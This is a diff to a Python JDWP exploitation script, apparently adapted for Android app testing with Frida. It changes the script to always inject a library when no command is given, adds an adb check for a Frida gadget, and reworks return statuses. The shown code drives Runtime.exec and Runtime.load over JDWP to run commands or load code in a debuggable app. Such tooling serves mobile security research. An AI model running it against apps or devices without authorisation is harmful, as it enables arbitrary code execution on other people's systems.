@@ -512,7 +512,7 @@ def runtime_exec(jdwp, args):
     # 5. Now we can execute any code
     if args.cmd:
         runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], args.cmd)
-    elif args.loadlib:
+    else:
         if hasattr(args, 'package_name') and args.package_name:
             packagename = args.package_name
             print(f"Using package name from Frida: {packagename}")
@@ -533,9 +533,6 @@ def runtime_exec(jdwp, args):
         jdwp.socket.settimeout(60)
         time.sleep(2)
         print("[*] Library should now be loaded")
-    else:
-        # by default, only prints out few system properties
-        runtime_exec_info(jdwp, tId)
 
     jdwp.resumevm()
 
@@ -748,12 +745,20 @@ def runtime_load_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, libra
     print("[+] Runtime.load(%s) probably successful" % library)
 
     return True
-
+def _is_gadget_running(pid):
+    result = subprocess.run(
+        ["adb", "shell", f"ss 2>/dev/null | grep '127.0.0.1:27042'"],
+        capture_output=True, text=True
+    )
+    return "127.0.0.1:27042" in result.stdout
 def run_jdwp(target, port, cmd=None, loadlib=None, break_on="android.os.Handler.dispatchMessage", package_name=None):
     classname, meth = str2fqclass(break_on)
 
     class Args:
         pass
+    if _is_gadget_running(None):
+                print("[*] Detected Frida gadget running on device, will attempt to use it for library injection")
+                return {"status": "gadget_detected"}
 
     args = Args()
     args.target = target
@@ -782,20 +787,20 @@ def run_jdwp(target, port, cmd=None, loadlib=None, break_on="android.os.Handler.
 
         print("run_jdwp: calling runtime_exec...")
         success = runtime_exec(cli, args)
-        return {"success": success}
+        return {"status": "completed" if success else "failed"}
     
     except socket.timeout:
-        return {"success": False, "error": "Timeout waiting for breakpoint — app may not be calling the method"}
+        return {"status": "timeout", "error_message": "Timeout waiting for breakpoint — app may not be calling the method"}
     except Exception as e:
         traceback.print_exc()
-        return {"success": False, "error": str(e)}
+        return {"status": "unknown_error", "error_message": str(e)}
     finally:
         cli.leave()
 
 def str2fqclass(s):
     i = s.rfind('.')
     if i == -1:
-        print("Cannot parse path")
+        print("[-] Cannot parse path")
         sys.exit(1)
 
     method = s[i:][1:]
@@ -805,7 +810,6 @@ def str2fqclass(s):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
-        description="Universal exploitation script for JDWP by @_hugsy_",
         formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 
     parser.add_argument("-t", "--target", type=str, metavar="IP",
